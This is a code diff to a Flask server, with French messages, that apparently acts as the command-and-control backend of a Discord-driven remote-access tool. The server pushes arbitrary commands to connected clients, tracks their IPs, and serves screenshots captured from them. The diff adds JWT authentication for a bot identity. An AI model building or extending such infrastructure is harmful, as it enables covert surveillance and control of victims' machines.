@@ -2,7 +2,8 @@ import base64
 import os
 from datetime import datetime
 
-from flask import Flask, request, jsonify, send_from_directory
+from flask import Flask, request, jsonify, send_file
+from flask_jwt_extended import create_access_token, jwt_required, JWTManager
 from flask_migrate import Migrate
 from flask_socketio import SocketIO
 
@@ -13,6 +14,7 @@ app = Flask(__name__)
 app.config.from_object(Config)
 db.init_app(app)
 migrate = Migrate(app, db)
+jwt = JWTManager(app)
 
 # Models
 from models import Client, Screenshot
@@ -21,7 +23,18 @@ socketio = SocketIO(app)
 clients = {}
 
 
+@app.route('/api/v1/auth', methods=['POST'])
+def authenticate():
+    auth_data = request.json
+    if auth_data and auth_data.get('secret_key') == app.config['JWT_SECRET_KEY']:
+        access_token = create_access_token(identity='bot_discord')
+        return jsonify(access_token=access_token), 200
+    else:
+        return jsonify({"msg": "Mauvaise clé secrète"}), 401
+
+
 @app.route('/api/v1/command/<int:client_id>', methods=['POST'])
+@jwt_required()
 def handle_command(client_id):
     command_data = request.get_json()
     command = command_data.get('command')
@@ -35,7 +48,8 @@ def emit_command_to_client(client_id, command):
     client = Client.query.get(client_id)
     if client and client.status == 'online':
         socketio.emit('command', {'command': command}, room=client.sid)
-        return jsonify({'status': 'success', 'message': f'Commande *{command}* envoyée au **client {client_id} / {client.ip}**.'}), 200
+        return jsonify({'status': 'success',
+                        'message': f'Commande *{command}* envoyée au **client {client_id} / {client.ip}**.'}), 200
     elif client and client.status == 'offline':
         return jsonify({'status': 'error', 'message': f'**🔴 Client {client_id} hors ligne.'}), 400
     else:
@@ -43,6 +57,7 @@ def emit_command_to_client(client_id, command):
 
 
 @app.route('/api/v1/clients', methods=['GET'])
+@jwt_required()
 def get_clients():
     status_filter = request.args.get('status')
     if status_filter:
@@ -61,7 +76,7 @@ def get_clients():
             'status': client.status,
             'date_created': client.date_created.strftime('%d/%m/%Y à %H:%M:%S'),
             'date_updated': client.date_updated.strftime('%d/%m/%Y à %H:%M:%S')
-         }
+        }
         for client in clients]
     return jsonify({'status': 'success', 'clients': clients_info}), 200
 
@@ -74,6 +89,7 @@ def list_screenshots(directory):
 
 
 @app.route('/api/v1/screenshot/client/<int:client_id>', methods=['GET'])
+@jwt_required()
 def get_screenshots_by_client_id(client_id):
     screenshots = Screenshot.query.filter_by(client_id=client_id).all()
     screenshots_info = [{
@@ -88,7 +104,7 @@ def get_screenshots_by_client_id(client_id):
 def get_screenshot_image(screenshot_id):
     screenshot = Screenshot.query.get(screenshot_id)
     if screenshot and os.path.exists(screenshot.file_path):
-        return send_from_directory(os.path.dirname(screenshot.file_path), os.path.basename(screenshot.file_path))
+        return send_file(screenshot.file_path, mimetype='image/png')
     else:
         return jsonify({'status': 'error', 'message': 'Capture d\'écran non trouvée.'}), 404
 
